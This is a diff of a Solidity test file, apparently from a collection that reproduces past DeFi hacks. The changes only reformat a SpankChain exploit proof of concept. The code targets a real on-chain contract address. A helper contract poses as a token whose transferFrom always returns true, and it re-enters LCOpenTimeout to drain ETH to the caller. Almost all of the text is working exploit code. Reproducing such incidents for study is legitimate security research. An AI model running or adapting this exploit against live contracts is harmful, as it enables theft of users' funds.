@@ -13,9 +13,9 @@ import "../basetest.sol";
 // Vulnerable Contract Code : https://etherscan.io/address/0xf91546835f756DA0c10cFa0CDA95b15577b84aA7#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 pragma solidity ^0.8.0;
 
 interface ISpankChain {
@@ -26,9 +26,11 @@ interface ISpankChain {
         address _token,
         uint256[2] memory _balances // [eth, token]
     ) external payable;
-    function LCOpenTimeout(bytes32 _lcID) external;
+    function LCOpenTimeout(
+        bytes32 _lcID
+    ) external;
 
-    event DidLCOpen (
+    event DidLCOpen(
         bytes32 indexed channelId,
         address indexed partyA,
         address indexed partyI,
@@ -56,24 +58,28 @@ contract SpankChainExploit is BaseTestWithBalanceLog {
         payable(address(0x0)).transfer(5 ether); //simulation replay flashloan
     }
 
-    fallback() payable external {}
+    fallback() external payable {}
 }
 
 contract SpankChainExploitHelper {
     ISpankChain spankChain = ISpankChain(0xf91546835f756DA0c10cFa0CDA95b15577b84aA7);
     uint256 limit;
     uint256 count = 1;
-    function exploit(uint256 c) payable public {
+
+    function exploit(
+        uint256 c
+    ) public payable {
         limit = c;
         uint256[2] memory balances;
-        balances[0] = 5000000000000000000;
+        balances[0] = 5_000_000_000_000_000_000;
         balances[1] = 1;
         spankChain.createChannel{value: 5 ether}(
             hex"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45",
-            msg.sender, 
-            type(uint256).max - block.timestamp + 1, 
-            address(this), 
-            balances);
+            msg.sender,
+            type(uint256).max - block.timestamp + 1,
+            address(this),
+            balances
+        );
         spankChain.LCOpenTimeout(hex"4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45");
         payable(msg.sender).transfer(address(this).balance);
     }
@@ -85,10 +91,10 @@ contract SpankChainExploitHelper {
         }
         return true;
     }
-    
-    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool){
-        return true;
-    } 
 
-    fallback() payable external {}
+    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+        return true;
+    }
+
+    fallback() external payable {}
 }
